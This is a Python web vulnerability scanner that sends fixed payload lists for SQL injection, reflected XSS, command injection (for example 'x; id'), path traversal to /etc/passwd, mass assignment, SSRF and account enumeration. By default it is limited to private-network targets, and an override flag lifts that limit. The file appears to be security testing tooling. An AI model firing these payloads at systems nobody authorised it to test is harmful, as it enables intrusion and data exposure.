"""
Minimal, LLM-free, rule-based vulnerability auto-scanner.

Strix (AI-agent pentesting) uses an LLM to decide what to try next, and
can look for many vulnerability classes (SQLi, XSS, SSRF, auth bugs, ...).
This script replaces that decision-making with a fixed payload list PER
vulnerability class, and deterministic response checks -- no LLM, no
agent loop, no Docker. Adding a new class means adding a new entry to
VULN_CLASSES below: a payload list + a detect() function.

Scope: run only against targets you own/control, e.g. vulnerable_app.py
in this same directory.
"""

from __future__ import annotations

import argparse
import ipaddress
import re
import socket
import sys
from dataclasses import dataclass, field
from typing import Callable
from urllib.parse import urlparse

import requests

# PHP2Shell (CVE-2026-109618, CVE-2026-109619; CVSS 9.2): critical
# memory-safety vulnerabilities in the PHP runtime itself, not an
# application-level bug -- affects any app running on a vulnerable PHP
# version. Disclosed 2026-10 (Wiz Research / OpenAI Codex Security / Calif).
# This is a version-range check only (no exploit code): first-fixed release
# per branch, as published at https://www.php2shell.com/ on 2026-10-21.
PHP2SHELL_FIRST_FIXED = {
    (8, 2): (8, 2, 35),
    (8, 3): (8, 3, 36),
    (8, 4): (8, 4, 27),
    (8, 5): (8, 5, 12),
}
PHP2SHELL_REFERENCE = (
    "PHP2Shell (CVE-2026-109618/109619, CVSS 9.2): a PHP *runtime* bug, "
    "not an application bug -- affects any app on a vulnerable PHP version. "
    "https://www.php2shell.com/"
)


def check_php2shell(powered_by: str) -> str | None:
    """Compare an 'X-Powered-By: PHP/x.y.z' header against PHP2Shell's
    first-fixed version per branch. Returns a warning string if the version
    looks vulnerable, else None. This is a version-range comparison, not an
    exploit attempt -- it never sends a PHP2Shell payload."""
    m = re.search(r"PHP/(\d+)\.(\d+)\.(\d+)", powered_by or "")
    if not m:
        return None
    major, minor, patch = (int(x) for x in m.groups())
    branch = (major, minor)
    version_str = f"{major}.{minor}.{patch}"

    if branch in PHP2SHELL_FIRST_FIXED:
        fixed = PHP2SHELL_FIRST_FIXED[branch]
        if (major, minor, patch) < fixed:
            fixed_str = ".".join(str(x) for x in fixed)
            return (
                f"PHP {version_str} is below the first fixed release {fixed_str} "
                f"for this branch -- vulnerable to {PHP2SHELL_REFERENCE}"
            )
        return None

    if branch < (8, 2):
        return (
            f"PHP {version_str} is on a branch (< 8.2) this repo has no confirmed "
            f"fixed version for -- treat as vulnerable until checked against "
            f"php.net's own advisory. {PHP2SHELL_REFERENCE}"
        )

    return None  # branch newer than what this repo has data for (e.g. 8.6+)

# Same allow-list as netcheck/netcheck.py: loopback + RFC1918 private ranges.
# This scanner actually fires live attack payloads, so by default it refuses
# to touch anything that isn't a target you plausibly run yourself.
ALLOWED_NETWORKS = [
    ipaddress.ip_network(net)
    for net in ("127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "::1/128")
]


def _is_allowed_target(url: str) -> tuple[bool, str]:
    host = urlparse(url).hostname
    if not host:
        return False, f"could not parse a hostname out of {url!r}"

    try:
        infos = socket.getaddrinfo(host, None)
    except socket.gaierror as exc:
        return False, f"could not resolve host {host!r}: {exc}"

    addrs = {info[4][0] for info in infos}
    for addr in addrs:
        ip = ipaddress.ip_address(addr)
        if not any(ip in net for net in ALLOWED_NETWORKS):
            return False, (
                f"{host!r} resolves to {addr}, which is outside localhost/RFC1918 "
                f"private ranges. This scanner only fires live attack payloads at "
                f"targets you own; pass --i-own-this-target to override."
            )
    return True, ""

# --------------------------------------------------------------------------
# SQLi
# --------------------------------------------------------------------------

SQL_ERROR_MARKERS = (
    "sql error",
    "sqlite3.operationalerror",
    "you have an error in your sql syntax",
    "unclosed quotation mark",
    "odbc sql server driver",
)

SQLI_PAYLOADS = [
    "' --",
    "' OR '1'='1' --",
    '" OR "1"="1" --',
    "' OR 1=1 --",
    "') OR ('1'='1' --",
    "' UNION SELECT NULL,NULL,NULL --",
    "'",
    '"',
]


def detect_sqli(resp: requests.Response, baseline: requests.Response, payload: str) -> str | None:
    text = resp.text.lower()
    if any(marker in text for marker in SQL_ERROR_MARKERS):
        return "error-based: SQL error leaked in response"

    baseline_looked_like_success = "login ok" in baseline.text.lower()
    if not baseline_looked_like_success and "login ok" in text:
        return "boolean/auth-bypass: baseline failed, payload succeeded"

    if resp.status_code != baseline.status_code:
        return f"status code changed ({baseline.status_code} -> {resp.status_code})"

    return None


# --------------------------------------------------------------------------
# Reflected XSS: payload reflected verbatim (unescaped) in the HTML body
# --------------------------------------------------------------------------

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    "'><svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
]


def detect_xss(resp: requests.Response, baseline: requests.Response, payload: str) -> str | None:
    # If the exact payload (with its angle brackets/quotes intact) shows up
    # verbatim in the body, the app reflected it without HTML-escaping.
    if payload in resp.text:
        return "reflected: payload echoed back unescaped in HTML body"
    return None


# --------------------------------------------------------------------------
# OS command injection: a marker command's distinctive output leaks into
# the response when shell metacharacters are not neutralized.
# --------------------------------------------------------------------------

CMDI_PAYLOADS = [
    "x; id",
    "x && id",
    "x | id",
    "x `id`",
    "x $(id)",
]


def detect_cmdi(resp: requests.Response, baseline: requests.Response, payload: str) -> str | None:
    if "uid=" in resp.text and "uid=" not in baseline.text:
        return "command injection: 'id' output leaked into response"
    return None


# --------------------------------------------------------------------------
# Path traversal: ../ sequences escape the intended directory and reach
# an unrelated file (/etc/passwd here, as a readable marker file).
# --------------------------------------------------------------------------

TRAVERSAL_PAYLOADS = [
    "../" * 10 + "etc/passwd",
    "..%2f" * 10 + "etc/passwd",
    "....//" * 10 + "etc/passwd",
]


def detect_traversal(resp: requests.Response, baseline: requests.Response, payload: str) -> str | None:
    if "root:x:0:0" in resp.text:
        return "path traversal: read /etc/passwd outside the intended directory"
    return None


# --------------------------------------------------------------------------
# Mass assignment: inject a field (is_admin) the caller should never be
# able to set, and see if it gets bound onto the created object anyway.
# --------------------------------------------------------------------------

MASS_ASSIGNMENT_PAYLOADS = [
    "true",
    "1",
    "True",
]


def detect_mass_assignment(resp: requests.Response, baseline: requests.Response, payload: str) -> str | None:
    marker = f"'is_admin': '{payload}'"
    if marker in resp.text and marker not in baseline.text:
        return "mass assignment: is_admin accepted from request params and bound onto the new account"
    return None


# --------------------------------------------------------------------------
# SSRF: ask the server to fetch a URL pointing at an internal-only service
# and look for that service's own secret coming back in the response.
# --------------------------------------------------------------------------

SSRF_SECRET_MARKER = "INTERNAL-SECRET-KEY-DO-NOT-EXPOSE"

SSRF_PAYLOADS = [
    "http://127.0.0.1:5001/latest/meta-data/secret-key",
    "http://localhost:5001/latest/meta-data/secret-key",
]


def detect_ssrf(resp: requests.Response, baseline: requests.Response, payload: str) -> str | None:
    if SSRF_SECRET_MARKER in resp.text:
        return "SSRF confirmed: an internal-only service's secret was fetched via the server"
    return None


# --------------------------------------------------------------------------
# Account enumeration: a known-already-registered value should look no
# different from an unregistered one, if the endpoint is fixed.
# --------------------------------------------------------------------------

ACCOUNT_ENUM_PAYLOADS = [
    "alice@example.com",
]


def detect_account_enum(resp: requests.Response, baseline: requests.Response, payload: str) -> str | None:
    if resp.status_code != baseline.status_code or "already registered" in resp.text.lower():
        return f"account enumeration: distinct response reveals {payload!r} is already registered"
    return None


# --------------------------------------------------------------------------
# Registry: add a new vulnerability class here
# --------------------------------------------------------------------------


@dataclass
class VulnClass:
    payloads: list[str]
    detect: Callable[[requests.Response, requests.Response, str], str | None]
    # Only set when this repo has already verified a real-world incident in
    # the same vulnerability class against a primary source (see
    # ../lineage.md). Left unset rather than guessed -- not every class here
    # has one.
    reference: str | None = None


VULN_CLASSES: dict[str, VulnClass] = {
    "sqli": VulnClass(
        SQLI_PAYLOADS,
        detect_sqli,
        reference=(
            "wp2shell: WordPress REST API batch-endpoint route confusion "
            "(CVE-2026-63030) exposing an unauthenticated SQLi (CVE-2026-60137), "
            "used in the wild to place a webshell (Wiz, 2026-10). This repo's R13: "
            "../detections/sigma/r13_wp2shell_wordpress_batch_exploitation.yml"
        ),
    ),
    "xss": VulnClass(XSS_PAYLOADS, detect_xss),
    "cmdi": VulnClass(CMDI_PAYLOADS, detect_cmdi),
    "traversal": VulnClass(TRAVERSAL_PAYLOADS, detect_traversal),
    "mass_assignment": VulnClass(MASS_ASSIGNMENT_PAYLOADS, detect_mass_assignment),
    "ssrf": VulnClass(
        SSRF_PAYLOADS,
        detect_ssrf,
        reference=(
            "Double Agents: GCP Vertex AI's overly broad default service-account "
            "permissions, reachable via SSRF to the cloud metadata service, abused "
            "for LLMjacking (Unit 42). This repo's R10: "
            "../detections/sigma/r10_metadata_service_credential_access.yml"
        ),
    ),
    "account_enum": VulnClass(ACCOUNT_ENUM_PAYLOADS, detect_account_enum),
}


@dataclass
class Finding:
    param: str
    payload: str
    reason: str
    response_snippet: str = field(repr=False)


@dataclass
class TargetAssessment:
    status_code: int
    elapsed_ms: float
    content_length: int
    server: str
    powered_by: str
    content_type: str


def assess_target(url: str, base_params: dict[str, str]) -> TargetAssessment:
    """Baseline probe before firing any attack payload. Separates "target is
    down/misconfigured" (this raises) from "scanned fine, found nothing"
    (the actual scan below), and surfaces enough about the target (status,
    size, Server/X-Powered-By) to sanity-check --baseline/--url before
    trusting a "no indicators found" result."""
    resp = requests.get(url, params=base_params, timeout=10)
    return TargetAssessment(
        status_code=resp.status_code,
        elapsed_ms=resp.elapsed.total_seconds() * 1000,
        content_length=len(resp.content),
        server=resp.headers.get("Server", "(none)"),
        powered_by=resp.headers.get("X-Powered-By", "(none)"),
        content_type=resp.headers.get("Content-Type", "(none)"),
    )


def print_target_assessment(a: TargetAssessment) -> None:
    print("Target assessment:")
    print(f"  status={a.status_code} size={a.content_length}B time={a.elapsed_ms:.0f}ms content-type={a.content_type!r}")
    print(f"  Server={a.server!r} X-Powered-By={a.powered_by!r}")
    if a.status_code >= 400:
        print(
            f"  warning: baseline request returned {a.status_code} -- findings below may be "
            "unreliable (check --baseline params and --url path)"
        )
    php2shell_warning = check_php2shell(a.powered_by)
    if php2shell_warning:
        print(f"  warning: {php2shell_warning}")


def probe(
    url: str, base_params: dict[str, str], param: str, payload: str
) -> requests.Response:
    params = dict(base_params)
    params[param] = payload
    return requests.get(url, params=params, timeout=10)


def scan(
    url: str, base_params: dict[str, str], fuzz_params: list[str], vuln_class: VulnClass
) -> list[Finding]:
    baseline = requests.get(url, params=base_params, timeout=10)

    findings: list[Finding] = []
    for param in fuzz_params:
        for payload in vuln_class.payloads:
            resp = probe(url, base_params, param, payload)
            reason = vuln_class.detect(resp, baseline, payload)
            if reason:
                findings.append(Finding(param, payload, reason, resp.text))

    return findings


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", required=True, help="e.g. http://127.0.0.1:5000/search")
    parser.add_argument(
        "--class",
        dest="vuln_class_name",
        required=True,
        choices=sorted(VULN_CLASSES),
        help="vulnerability class to test for",
    )
    parser.add_argument(
        "--baseline",
        action="append",
        default=[],
        metavar="KEY=VALUE",
        help="known-benign baseline param, repeatable, e.g. --baseline q=zzz",
    )
    parser.add_argument(
        "--fuzz",
        action="append",
        required=True,
        help="param name to fuzz, repeatable, e.g. --fuzz q",
    )
    parser.add_argument(
        "--i-own-this-target",
        action="store_true",
        help="override the localhost/RFC1918-only scope check; only use this "
        "against a target you actually own or are explicitly authorized to test",
    )
    args = parser.parse_args()

    if not args.i_own_this_target:
        allowed, reason = _is_allowed_target(args.url)
        if not allowed:
            print(f"Refusing to scan: {reason}", file=sys.stderr)
            return 2

    base_params = dict(kv.split("=", 1) for kv in args.baseline)
    vuln_class = VULN_CLASSES[args.vuln_class_name]

    print(f"Target: {args.url}")
    print(f"Vulnerability class: {args.vuln_class_name}")
    print(f"Baseline params: {base_params}")
    print(f"Fuzzing params: {args.fuzz}")
    print(f"Payload count: {len(vuln_class.payloads)}")
    print("-" * 60)

    try:
        assessment = assess_target(args.url, base_params)
    except requests.RequestException as exc:
        print(f"Target assessment failed -- aborting before firing any payload: {exc}", file=sys.stderr)
        return 2
    print_target_assessment(assessment)
    print("-" * 60)

    findings = scan(args.url, base_params, args.fuzz, vuln_class)

    if not findings:
        print("No indicators found with this payload set.")
        return 0

    print(f"{len(findings)} finding(s):\n")
    for f in findings:
        print(f"  param={f.param!r} payload={f.payload!r}")
        print(f"    reason: {f.reason}")
        print()

    if vuln_class.reference:
        print(f"Related real-world incident: {vuln_class.reference}")

    return 1


if __name__ == "__main__":
    sys.exit(main())
